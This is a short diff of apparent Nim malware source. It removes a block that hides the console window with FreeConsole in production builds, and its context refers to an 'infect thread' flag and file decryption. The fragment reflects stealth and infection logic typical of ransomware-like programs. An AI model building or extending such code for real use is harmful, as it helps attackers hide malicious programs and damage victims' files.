@@ -1,9 +1,3 @@
-# hide the console window
-from lib/constants import isProd
-when isProd:
-  from winim/inc/wincon import FreeConsole
-  FreeConsole()
-
 from lib/flags import USE_INFECT_THREAD
 when USE_INFECT_THREAD:
   # decrypt file if args passed
